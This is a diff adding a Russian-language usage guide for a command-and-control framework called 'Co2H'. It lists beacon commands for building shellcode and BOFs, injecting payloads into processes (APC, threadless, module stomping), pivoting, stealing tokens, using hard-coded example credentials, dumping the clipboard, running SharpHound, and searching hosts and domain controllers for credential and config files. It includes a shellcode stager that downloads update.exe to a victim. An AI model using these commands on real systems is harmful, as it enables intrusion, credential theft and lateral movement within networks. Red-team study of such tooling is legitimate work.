@@ -1,0 +1,175 @@
+Co2H практические сценарии — реальные примеры использования команд beacon'а.
+
+Сначала собери артефакты:
+    powershell -ExecutionPolicy Bypass -File stand\build-stand.ps1
+
+Результат в stand\build\:
+    Shellcode:
+        sc_ret.x64.bin       — тихое завершение (sanity check)
+        sc_int3.x64.bin      — debug breakpoint
+        sc_spin.x64.bin      — CPU spike на 100мс
+        sc_msgbox.x64.bin    — MessageBox "pwned by Co2H"
+        sc_download.x64.bin  — HTTP download в %TEMP%\update.exe
+
+    BOF:
+        bof_hello.x64.o      — тест BOF loader'а (pid/tid)
+        bof_whoami.x64.o     — GetUserName (текущий пользователь)
+        bof_netstat.x64.o    — TCP connections с PID/процессами
+        bof_enum_sessions.x64.o  — WTS sessions (RDP/console users)
+        bof_find_files.x64.o     — поиск файлов по маске
+        bof_clipboard.x64.o      — дамп содержимого clipboard'а
+
+================================================================================
+LATERAL MOVEMENT — проникновение в другие процессы/хосты
+================================================================================
+
+# Разведка целей для инъекции
+ps
+pscmd explorer.exe                    # Найти GUI процессы (для sc_msgbox)
+pscmd notepad.exe                     # Простые жертвы
+
+# Демонстрация доставки с визуальным подтверждением
+inject 1234 stand\build\sc_msgbox.x64.bin      # MessageBox в GUI процессе
+spawnto stand\build\sc_msgbox.x64.bin          # В новом дочернем процессе
+
+# Тестирование APC delivery (нужен alertable wait)
+inject_apc 1234 stand\build\sc_spin.x64.bin    # APC в explorer/notepad
+
+# Бесследная доставка (threadless)
+inject_less stand\build\sc_spin.x64.bin        # В beacon process через threadpool
+
+# Module stomping (исполнение в легитимном DLL)
+modstomp stand\build\sc_spin.x64.bin
+modstomp stand\build\sc_msgbox.x64.bin C:\Windows\System32\comctl32.dll
+
+# Pivot через зараженный хост (нет прямой связности с C2)
+tcp_pivot 10.0.0.15 4445              # К teamserver через промежуточный beacon
+
+================================================================================
+RECONNAISSANCE — разведка среды и сбор данных
+================================================================================
+
+# Базовая инфо о хосте и пользователе
+getuid                                # Текущий пользователь + SID
+bof stand\build\bof_whoami.x64.o      # Тот же результат через BOF
+
+# Сетевая разведка
+bof stand\build\bof_netstat.x64.o     # TCP connections без netstat.exe
+shell netstat -an | findstr LISTEN    # Сравнить с классическим netstat
+
+# Активные пользователи (RDP sessions, console logins)
+bof stand\build\bof_enum_sessions.x64.o
+
+# Поиск интересных файлов
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Documents\*.txt"
+bof stand\build\bof_find_files.x64.o "C:\inetpub\wwwroot\*.config"
+bof stand\build\bof_find_files.x64.o "C:\Program Files\*\*.config"
+
+# Дамп clipboard (пароли, пути, URLs)
+bof stand\build\bof_clipboard.x64.o
+
+# Процессы (детальная инфо)
+ps
+shell tasklist /v                     # Сравнить с нативным tasklist
+
+================================================================================
+PERSISTENCE & PRIVILEGE ESCALATION — закрепление и повышение привилегий
+================================================================================
+
+# Кража токена процесса с высокими привилегиями
+steal_token 666                       # PID процесса под SYSTEM/Admin
+getuid                                # Проверить новый контекст
+bof stand\build\bof_whoami.x64.o      # Подтвердить через BOF
+
+# Сетевая аутентификация (pass-the-password)
+make_token CORP\admin SecretP@ss!
+getuid                                # Локальный контекст не изменился
+shell dir \\fileserver\c$            # Сетевые команды идут под admin
+
+# Возврат к исходному токену
+rev2self
+getuid
+
+================================================================================
+EVASION & OPSEC — обход защиты и скрытность
+================================================================================
+
+# .NET assembly execution (in-process CLR)
+execute-assembly C:\Tools\Seatbelt.exe -group=system
+execute-assembly C:\Tools\SharpHound.exe --CollectionMethods All
+
+# BOF vs. assembly сравнение производительности
+bof stand\build\bof_netstat.x64.o     # Быстро, нативный код
+execute-assembly C:\Tools\netstat.exe  # Медленнее, .NET загрузка
+
+# Shellcode staging (второй этап через HTTP)
+# Отредактируй sc_download.asm (URL + IP), затем:
+inject 1234 stand\build\sc_download.x64.bin
+# Ждать download в %TEMP%\update.exe на жертве
+
+================================================================================
+TESTING & VALIDATION — тестирование и верификация
+================================================================================
+
+# Проверка BOF loader'а
+bof stand\build\bof_hello.x64.o       # Должен показать pid/tid
+                                      # Если работает → релокации, imports OK
+
+# Тест различных shellcode delivery методов с одним payload
+inject 1234 stand\build\sc_ret.x64.bin
+inject_apc 1234 stand\build\sc_ret.x64.bin
+inject_less stand\build\sc_ret.x64.bin
+spawnto stand\build\sc_ret.x64.bin
+modstomp stand\build\sc_ret.x64.bin
+# Все должны отработать без ошибок
+
+# Debugging delivery с breakpoint
+inject 1234 stand\build\sc_int3.x64.bin   # Прицепи отладчик к PID 1234 заранее
+# RIP остановится ровно в точке delivery
+
+# Performance impact testing
+inject 1234 stand\build\sc_spin.x64.bin   # Всплеск CPU на ~100мс в Process Explorer
+
+================================================================================
+CREDENTIAL HARVESTING — сбор учетных данных
+================================================================================
+
+# Clipboard mining
+bof stand\build\bof_clipboard.x64.o   # Пароли, скопированные пользователем
+
+# Token stealing цепочка
+ps                                     # Найти процесс под Domain Admin
+steal_token 1337                      # Украсть токен
+bof stand\build\bof_whoami.x64.o      # Подтвердить новую identity
+shell dir \\dc01\c$                   # Доступ к Domain Controller
+creds list                            # Проверить хранилище creds на teamserver
+
+# Network credential usage
+make_token CORP\svcaccount P@ssw0rd123
+shell copy \\dc01\sysvol\script.bat C:\temp\
+creds add CORP svcaccount password P@ssw0rd123 dc01 "service account"
+
+================================================================================
+INFRASTRUCTURE MAPPING — картирование инфраструктуры
+================================================================================
+
+# Network connections analysis
+bof stand\build\bof_netstat.x64.o     # Исходящие соединения → другие хосты
+                                      # ESTABLISHED → активные сессии
+                                      # LISTEN → сервисы
+
+# Multi-user environment
+bof stand\build\bof_enum_sessions.x64.o  # RDP sessions → lateral targets
+                                         # Console → локальные пользователи
+                                         # Disconnected → недавняя активность
+
+# File hunting for network intel
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Desktop\*.rdp"
+bof stand\build\bof_find_files.x64.o "C:\Users\*\Documents\*.bat"
+bof stand\build\bof_find_files.x64.o "C:\Program Files*\*\config*.xml"
+
+ПРИМЕЧАНИЯ:
+- Замени PID примеры (1234, 666, 1337) на реальные из `ps`
+- Для sc_download.asm отредактируй URL и IP перед сборкой
+- make_token требует валидные credentials в AD-среде
+- Некоторые команды требуют повышенных привилегий (steal_token, inject)
